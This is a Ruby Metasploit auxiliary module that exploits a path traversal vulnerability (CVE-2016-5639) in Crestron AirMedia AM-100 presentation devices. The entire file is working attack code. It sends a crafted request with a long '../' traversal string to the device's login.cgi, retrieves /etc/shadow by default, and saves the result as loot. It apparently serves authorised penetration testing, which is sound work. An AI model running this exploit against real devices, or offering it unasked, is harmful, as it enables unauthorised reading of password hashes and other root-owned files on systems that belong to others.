##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

    def initialize
        super(
            'Name'        => 'Crestron AirMedia AM-100 Linux Path Traversal',
            'Description' => %q{
                This module exploits a path traversal in Crestron AirMedia AM-100 devices with
                firmware version <1.4.0.13. This path traversal vulnerability will most likely
                access files as root.
            },
            'References'  => [
                [ 'CVE', 'CVE-2016-5639' ],
                [ 'URL', 'https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-001.md' ]
            ],
            'Author'      => [
              'Forrest'
            ],
            'License'     => MSF_LICENSE,
            'DefaultOptions' => {
                'SSL'     => true
            },
            'DisclosureDate' => "2016-08-01"
        )
        register_options([
                Opt::RPORT(443),
                OptBool.new('SSL', [true, 'Use SSL', true]),
                OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow'])
            ], self.class
        )
    end

    # Function for attempting the directory traversal
    def get_file_function(file_path, opts = {})
        begin
            res = send_request_cgi(
                {
                  'uri'     => normalize_uri("/cgi-bin/login.cgi?lang=en&src=../../../../../../../../../../../../../../../../../../../..", file_path),
                  'method'  => 'GET',
                  'ssl'     => true,
                  'port'    => rport
                }
            )
            return res
            
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
            print_error("#{rhost}:#{rport} - HTTP(S) Connection Failed...")
            return
        end
    end
      
    def run
        if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
            print_error("Please supply the full path of the file you want to download")
            return
        end
    
        print_status("#{rhost}:#{rport} - Attempting path traversal to get: #{datastore['FILEPATH']}")
        
        traversal_response = get_file_function(datastore['FILEPATH'])
        good_traversal_response = (
            traversal_response &&
            traversal_response.code == 200
        )
        
        if good_traversal_response
            print_good("#{rhost}:#{rport} - Successfully retrieved #{datastore['FILEPATH']}")
        else
            print_error("#{rhost}:#{rport} - Failed to retrieve #{datastore['FILEPATH']}")
            return false
        end
        
        fname = File.basename(datastore['FILEPATH'])
        path = store_loot("crestron_traversal.file", "application/octet-stream", rhost, traversal_response.body, fname)
        print_good("File saved to path: " << path)
    end
end
